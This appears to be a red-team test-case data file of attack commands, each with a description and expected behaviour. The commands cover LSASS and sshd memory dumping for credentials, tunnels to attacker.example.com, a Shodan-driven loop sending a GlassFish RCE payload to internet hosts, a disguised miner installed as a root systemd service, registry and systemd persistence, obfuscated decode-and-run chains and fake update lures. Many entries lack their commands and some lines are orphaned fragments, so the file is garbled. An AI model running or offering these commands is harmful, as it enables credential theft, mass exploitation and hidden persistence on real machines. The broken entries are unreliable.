attacks.command: powershell -Command "if (Test-Path '$env:TEMP\PowerSploit.ps1') { . '$env:TEMP\PowerSploit.ps1'; Invoke-EnumerateDomain } else { Write-Host 'PowerSploit not found' }"
attacks.description: Basic PowerShell command that checks for a PowerSploit script in the TEMP folder, dot‑sources it, and runs a dummy function to list domain computers.
attacks.expected_behavior: If PowerSploit.ps1 is absent, prints 'PowerSploit not found'. If present, executes Invoke-EnumerateDomain which outputs placeholder computer names.

attacks.command: powershell -Command "$temp='$env:TEMP\PowerSploit.ps1'; Set-Content -Path $temp -Value '# Dummy PowerSploit`nfunction Invoke-EnumerateDomain { \"ComputerA\"; \"ComputerB\" }' -Encoding UTF8; . $temp; Invoke-EnumerateDomain"
attacks.description: Intermediate command that creates a harmless PowerSploit script in the TEMP directory, defines a dummy enumeration function, imports the script, and runs the function to simulate domain discovery.
attacks.expected_behavior: Writes two placeholder computer names (ComputerA and ComputerB) to the console.

attacks.command: powershell -NoProfile -ExecutionPolicy Bypass -Command "Import-Module '$env:TEMP\PowerSploit.ps1' -ErrorAction SilentlyContinue; if (Get-Command Invoke-EnumerateDomain -ErrorAction SilentlyContinue) { Invoke-EnumerateDomain } else { Write-Host 'Function not found' }"
attacks.description: Advanced command that attempts to import a PowerSploit module from TEMP with silent error handling, checks for the presence of the enumeration function, and runs it if available.
attacks.expected_behavior: If the module loads and defines Invoke-EnumerateDomain, the function runs and outputs placeholder data; otherwise it prints 'Function not found'.

attacks.command: for ip in $(seq 1 254); do ping -c 1 -W 1 192.168.1.$ip >/dev/null && echo "Host up: 192.168.1.$ip"; done
attacks.description: Basic ping sweep to discover live hosts on the 192.168.1.0/24 subnet.
attacks.expected_behavior: The command sends a single ICMP echo request to each address; for each responsive host it prints a line indicating the host is up.

attacks.description: Intermediate network discovery using nmap's ping scan to list active hosts on the subnet.
attacks.expected_behavior: Nmap sends ARP requests (or ICMP ping if ARP is unavailable) and reports each host that responds as "up".

attacks.command: for ip in $(seq 1 254); do nc -z -v -w 1 192.168.1.$ip 22 80 443 2>/dev/null && echo "Open ports on 192.168.1.$ip"; done
attacks.description: Advanced service scan probing ports 22, 80, and 443 on each host in the subnet using netcat.
attacks.expected_behavior: Netcat attempts to connect to the specified ports; if a connection succeeds, the script prints a line indicating that the host has open ports.

attacks.command: netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 connectaddress=10.0.0.5 connectport=80
attacks.description: Creates a TCP port proxy that forwards any inbound traffic on port 8080 to internal host 10.0.0.5 on port 80.
attacks.expected_behavior: The system begins listening on 0.0.0.0:8080 and forwards connections to 10.0.0.5:80, acting as a basic proxy tunnel.

attacks.description: Uses the built‑in OpenSSH client to open an SSH tunnel that forwards local port 1080 to 10.0.0.5:1080 via the remote SSH server.
attacks.expected_behavior: An SSH session is established (no command execution) and traffic sent to localhost:1080 is securely proxied to the internal target through the remote host.

attacks.command: sc create ProxyService binPath= "cmd.exe /c netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8443 connectaddress=10.0.0.5 connectport=443" start= auto && sc start ProxyService
attacks.description: Creates a Windows service named ProxyService that runs a netsh portproxy command at startup, then starts the service to immediately establish the tunnel.
attacks.expected_behavior: A new service is registered and started; it configures a persistent port proxy forwarding local port 8443 to 10.0.0.5:443, surviving reboots.

attacks.description: Establishes a background SOCKS5 proxy on localhost port 1080 that forwards traffic through an SSH connection to the remote attacker server.
attacks.expected_behavior: An SSH process runs in the background, listening on 127.0.0.1:1080. Applications configured to use this SOCKS5 proxy will have their traffic tunneled to attacker.example.com.

attacks.description: Creates a TCP forward that listens on local port 1080 and forwards all incoming connections to the remote server's port 443.
attacks.expected_behavior: socat runs in the foreground, accepting connections on 0.0.0.0:1080 and relaying the raw TCP stream to attacker.example.com:443, effectively acting as a simple proxy tunnel.

attacks.command: ssh -N -D 1080 user@attacker.example.com -f && iptables -t nat -A OUTPUT -p tcp --dport 80 -j REDIRECT --to-ports 1080
attacks.description: Starts an SSH SOCKS5 tunnel in the background and then uses iptables to transparently redirect all outbound HTTP traffic (port 80) to the local SOCKS proxy.
attacks.expected_behavior: The SSH command creates a SOCKS5 listener on 1080. The iptables rule rewrites outgoing TCP packets destined for port 80 to be sent to localhost:1080, causing HTTP requests to be proxied through the attacker-controlled tunnel.

attacks.description: Basic OS Credential Dumping: uses the built‑in comsvcs.dll via rundll32 to create a minidump of the LSASS process and writes it to the temporary directory.
attacks.expected_behavior: A file named lsass.dmp is created in the %TEMP% folder containing a memory dump of LSASS.

attacks.command: for /f "tokens=2" %i in ('wmic process where name^="lsass.exe" get ProcessId ^| findstr /r "[0-9]"') do rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump %i %TEMP%\lsass.dmp
attacks.description: Intermediate OS Credential Dumping: retrieves the LSASS process ID using wmic, then passes the PID to comsvcs.dll via rundll32 to generate the dump.
attacks.expected_behavior: The command resolves the LSASS PID and creates %TEMP%\lsass.dmp containing the LSASS memory image.

attacks.description: Advanced OS Credential Dumping: PowerShell obtains the LSASS PID, builds a safe dump path, and invokes rundll32 with comsvcs.dll to write the dump.
attacks.expected_behavior: A dump file lsass.dmp is created in the user's temporary directory, containing LSASS memory for credential extraction.

attacks.description: Creates a core dump of the sshd process using gcore, which can contain in‑memory credential data.
attacks.expected_behavior: A core file named /tmp/sshd_dump.<pid> is written, containing the memory image of the sshd process.

attacks.command: dd if=/proc/$(pidof sshd)/mem of=/tmp/sshd_mem bs=4096 count=1024
attacks.description: Reads raw memory of the sshd process via the /proc filesystem and writes the first 4 MiB to a file.
attacks.expected_behavior: A file /tmp/sshd_mem is created containing the captured memory segment, which can be examined for credential artifacts.

attacks.description: Scans the previously created core dump for typical Unix password hash patterns and saves any matches.
attacks.expected_behavior: Any lines matching common password hash formats are written to /tmp/extracted_hashes.txt for analysis.

attacks.command: shodan_api_key="YOUR_SHODAN_API_KEY"; curl -s "https://api.shodan.io/shodan/host/search?key=${shodan_api_key}&query=product:GlassFish" | grep -o '"ip_str":"[^"]*' | cut -d'"' -f4 | while read ip; do echo "Attempting exploit on $ip"; curl -s -X GET "http://${ip}:4848/management/domain/applications/application?command=deploy&payload=%24%7B%22java.lang.Runtime%22.getRuntime().exec('uname -a')%7D"; done

attacks.expected_behavior: For each discovered GlassFish server, the script sends an exploit request; vulnerable hosts will return system information from 'uname -a', while non‑vulnerable hosts will return an error or no output.

attacks.command: sudo bash -c 'for pid in $(pidof sshd sudo); do cp /proc/$pid/mem /tmp/mem_$pid 2>/dev/null; done' && for f in /tmp/mem_*; do strings $f | grep -iE "password|passwd|ssh"; done
attacks.description: Copy the memory of privileged processes (sshd and sudo) to temporary files and search for credential patterns.
attacks.expected_behavior: Memory images of sshd and sudo are saved under /tmp (e.g., /tmp/mem_<pid>). The subsequent strings command scans these images for keywords such as "password", "passwd", or "ssh", potentially exposing credential material.

attacks.command:
echo -e '#!/bin/bash
echo "Updating Flash..."
sleep 2
echo "Done."' > /tmp/update_flash.sh && chmod +x /tmp/update_flash.sh && echo "Please run /tmp/update_flash.sh to complete the Flash update."
attacks.description: Creates a fake Flash update script in /tmp and prompts the user to execute it, demonstrating user execution via social engineering.
attacks.expected_behavior: The script prints 'Updating Flash...', waits two seconds, then prints 'Done.' when the user runs /tmp/update_flash.sh.

attacks.command: curl -s -o /tmp/installer.sh file:///etc/issue && chmod +x /tmp/installer.sh && echo "Run /tmp/installer.sh to install the update."
attacks.description: Uses curl to download a script (from a local file URL to avoid external network) and asks the user to run it, simulating a malicious download prompt.
attacks.expected_behavior: The downloaded script (containing the contents of /etc/issue) is made executable; when run, it displays the file's content, illustrating user‑initiated execution.

attacks.command:
echo -e '#!/bin/bash\necho "Flash update in progress..."\nsleep 2\necho "Flash update completed."' > /tmp/flash_update.sh && chmod +x /tmp/flash_update.sh && mkdir -p "$HOME/Desktop" && cat <<'EOF' > "$HOME/Desktop/FlashUpdate.desktop"
[Desktop Entry]
Type=Application
Name=Flash Update
Exec=/tmp/flash_update.sh
Icon=application-default-icon
Terminal=true
EOF
chmod +x "$HOME/Desktop/FlashUpdate.desktop" && echo "A shortcut 'FlashUpdate.desktop' has been placed on your Desktop. Double‑click to run the update."
attacks.description: Places a .desktop shortcut on the user's Desktop that runs a fake Flash update script, leveraging user double‑click execution.
attacks.expected_behavior: When the user double‑clicks the FlashUpdate.desktop shortcut, the script /tmp/flash_update.sh runs, printing update messages to a terminal.

WantedBy=multi-user.target" > /etc/systemd/system/testservice.service && systemctl daemon-reload && systemctl enable --now testservice.service'

attacks.command:
echo -e "[Unit]
Description=System Update Service
After=network.target

[Service]
ExecStart=/usr/bin/sleep infinity

[Install]
WantedBy=multi-user.target" | sudo tee /etc/systemd/system/fake-update.service > /dev/null && sudo systemctl daemon-reload && sudo systemctl enable fake-update.service
attacks.description: Creates a fake system update service unit that runs 'sleep infinity' and enables it for persistence.
attacks.expected_behavior: A new file /etc/systemd/system/fake-update.service is written, systemd daemon is reloaded, and the service is enabled to start on boot.

attacks.command:
sudo cp /bin/true /usr/local/bin/fake-updater && sudo chmod +x /usr/local/bin/fake-updater && printf "[Unit]
Description=Fake System Update
After=network.target

[Service]
ExecStart=/usr/local/bin/fake-updater

[Install]
WantedBy=multi-user.target
" | sudo tee /etc/systemd/system/fake-update.service > /dev/null && sudo systemctl daemon-reload && sudo systemctl start fake-update.service && sudo systemctl enable fake-update.service
attacks.description: Copies a benign binary to a new location, creates a systemd unit that runs it, starts the service, and enables it for persistence.
attacks.expected_behavior: The fake-updater binary is placed in /usr/local/bin, a corresponding service unit is created, the service starts immediately, and it is enabled to launch on future boots.

attacks.command: echo -e "#!/bin/sh\nsleep 3600" | sudo tee /usr/local/bin/fake-updater > /dev/null && sudo chmod +x /usr/local/bin/fake-updater && sudo sed -i '/^\[Service\]/a ExecStartPost=/usr/local/bin/fake-updater' /etc/systemd/system/ssh.service && sudo systemctl daemon-reload && sudo systemctl restart ssh.service
attacks.description: Creates a simple script and injects it as an ExecStartPost command into an existing ssh.service unit, then reloads and restarts ssh to persist the additional process.
attacks.expected_behavior: A script that sleeps for an hour is written to /usr/local/bin/fake-updater. The ssh.service unit is modified to run this script after the main ssh daemon starts. Systemd daemon is reloaded and ssh service is restarted, causing the script to run on each ssh start.

attacks.command:
sudo curl -sSL http://example.com/miner -o /usr/local/bin/sshd-monitor && sudo chmod +x /usr/local/bin/sshd-monitor && echo -e '[Service]
ExecStart=/usr/local/bin/sshd-monitor
[Install]
WantedBy=multi-user.target' | sudo tee /etc/systemd/system/sshd-monitor.service >/dev/null && sudo systemctl enable --now sshd-monitor.service
attacks.description: Advanced systemd service installation with root
attacks.expected_behavior: Installs a masqueraded miner as a systemd service with root privileges, enabling stealthy persistence and resource consumption

attacks.description: Adds a Run key entry under the current user's registry hive to launch notepad.exe at logon.
attacks.expected_behavior: The registry value MyApp is created/updated; notepad.exe will start automatically on the next user logon.

attacks.description: Creates a system‑wide Run key entry that launches calc.exe for all users at logon.
attacks.expected_behavior: The HKLM Run value SystemApp is added; calc.exe will execute automatically for any user logging onto the machine.

attacks.description: PowerShell script that ensures the HKCU Run key exists and sets an AdvApp value pointing to write.exe.
attacks.expected_behavior: The registry key is created if missing and the AdvApp value is set; write.exe will run at the next user logon.

attacks.description: Create a .desktop autostart entry in the user's XDG autostart directory to run a script on user login.
attacks.expected_behavior: When the user logs into a graphical session, the desktop environment reads the .desktop file and executes the specified script, providing persistence without needing elevated privileges.

attacks.command:
echo -e "[Unit]
Description=Update Service
[Service]
ExecStart=/usr/local/bin/malicious.sh
[Install]
WantedBy=multi-user.target" > /etc/systemd/system/update.service && systemctl daemon-reload && systemctl enable update.service && systemctl start update.service
attacks.description: Create a system‑wide systemd service that runs a script at system boot, providing persistence for all users.
attacks.expected_behavior: With root privileges, the service file is placed in /etc/systemd/system, the systemd manager reloads its configuration, enables the service to start on boot, and starts it immediately. The script will execute each time the system boots, achieving persistence across reboots.

attacks.command: msg.exe * "Test IPC message from Red Team"
attacks.description: Sends a broadcast message to all logged‑on user sessions using the built‑in msg.exe utility, demonstrating simple inter‑process communication via the Windows messaging subsystem.
attacks.expected_behavior: All active user sessions display a pop‑up message containing 'Test IPC message from Red Team'.

attacks.command: powershell -Command "$pipe = New-Object System.IO.Pipes.NamedPipeServerStream('RedPipe',[System.IO.Pipes.PipeDirection]::InOut); $pipe.WaitForConnection(); $sr = New-Object System.IO.StreamReader($pipe); $msg = $sr.ReadLine(); Write-Host \"Received IPC: $msg\"; $pipe.Dispose()"
attacks.description: Creates a named‑pipe server named 'RedPipe' that waits for a client connection and reads a single line of text, illustrating a more advanced IPC channel between processes.
attacks.expected_behavior: The PowerShell session blocks until a client connects, then outputs 'Received IPC: <message>' where <message> is the string sent by the client.

attacks.command: powershell -Command "$client = New-Object System.IO.Pipes.NamedPipeClientStream('.','RedPipe',[System.IO.Pipes.PipeDirection]::Out); $client.Connect(); $sw = New-Object System.IO.StreamWriter($client); $sw.WriteLine('Hello from client'); $sw.Flush(); $client.Dispose()"
attacks.description: Acts as a client for the 'RedPipe' named pipe, connects to the server created by the previous command, and writes a test string, completing the IPC interaction.
attacks.expected_behavior: The client connects to the named pipe and sends the line 'Hello from client'. The server command then displays 'Received IPC: Hello from client'.

attacks.description: Creates a named pipe (FIFO) in /tmp, writes a test message into it, and reads the message from another process, demonstrating basic IPC via FIFO.
attacks.expected_behavior: The echo command writes 'test_message' into the FIFO, and the cat command reads and outputs the same message, confirming data transfer between processes.

attacks.command: rm -f /tmp/ipc_socket; socat - UNIX-LISTEN:/tmp/ipc_socket,fork & echo 'hello' | socat - UNIX-CONNECT:/tmp/ipc_socket
attacks.description: Sets up a Unix domain socket listener using socat and sends a string from a client process, demonstrating IPC via socket communication.
attacks.expected_behavior: The socat listener creates a socket file at /tmp/ipc_socket; the client writes 'hello' to the socket, which the listener receives and outputs, confirming socket-based IPC.

attacks.description: Starts a dbus-monitor to listen for a specific signal and then sends a method call with a payload over the session bus, illustrating advanced IPC via D-Bus.
attacks.expected_behavior: The monitor process displays the signal generated by the dbus-send command, showing that a message was successfully passed between processes over D-Bus.

attacks.description: Basic file obfuscation using certutil encoding/decoding cycle
attacks.expected_behavior: Creates Base64-encoded version of test.txt and decodes it back, demonstrating simple file format obfuscation

attacks.description: Intermediate string obfuscation via PowerShell with reversed text output
attacks.expected_behavior: Creates TEMP\obf.txt containing reversed string 'tseTolleH' using in-memory string manipulation

attacks.command: sc.exe create ObfSvc binPath= "\"C:\Windows\ System32\fake.dll\"" DisplayName= "Windows Update Helper"
attacks.description: Advanced service creation with obfuscated binary path
attacks.expected_behavior: Creates a service with misleading name and malformed binary path containing extra quotes/spaces to evade simple string matching

attacks.description: Basic obfuscation: a Base64‑encoded echo command is decoded, saved as a script, made executable, and run.
attacks.expected_behavior: Outputs "Hello World" to the console.

attacks.description: Intermediate obfuscation: the script is gzipped, then Base64‑encoded. At runtime it is decoded, decompressed, saved, and executed.
attacks.expected_behavior: Outputs "Hello World" to the console.

attacks.command: echo "U2FsdGVkX19+Z4uVqZJY9hQ5XcVh7R6XK5mE2XK4vYc=" | base64 -d | openssl enc -aes-256-cbc -d -pass pass:mysecret -pbkdf2 > /tmp/.obf3.sh && chmod +x /tmp/.obf3.sh && /tmp/.obf3.sh
attacks.description: Advanced obfuscation: the script is encrypted with AES‑256‑CBC, then Base64‑encoded. During execution it is decoded, decrypted, written to a file, made executable, and run.
attacks.expected_behavior: Outputs "Hello World" to the console after decryption.

attacks.description: Basic: Execute VBScript from user temp directory
attacks.expected_behavior: Creates harmless text file in TEMP via VBScript execution. Requires prior file creation: 'echo Set objFSO=CreateObject("Scripting.FileSystemObject"): Set objFile=objFSO.CreateTextFile("%TEMP%\\output.txt", True): objFile.WriteLine "Test" > %TEMP%\test_script.vbs'

attacks.description: Intermediate: Create and execute batch file
attacks.expected_behavior: Generates batch file in TEMP that launches calc.exe, then immediately executes it to demonstrate file creation/execution chain

attacks.description: Advanced: Base64 decode and execute batch file
attacks.expected_behavior: Decodes base64 payload into batch file using certutil and executes it (payload example: writes test file to TEMP). Base64 represents: '@echo off\necho TestPayload > %TEMP%\\certutil_test.txt'

attacks.description: Creates a simple script in /tmp, makes it executable, and runs it, simulating a user executing a malicious file they saved locally.
attacks.expected_behavior: Outputs: Hello from malicious script

attacks.description: Downloads a script from a remote location (simulated with example.com), marks it executable, and runs it, representing a typical user‑download‑and‑execute attack.
attacks.expected_behavior: If the remote file contains a harmless echo, it will print that message; otherwise, the command will fail silently due to -s.

attacks.description: Embeds a base64‑encoded script within the command, decodes it to a file, makes it executable, and runs it, showing an advanced obfuscation technique before user execution.
attacks.expected_behavior: Outputs: Hello from base64 decoded script
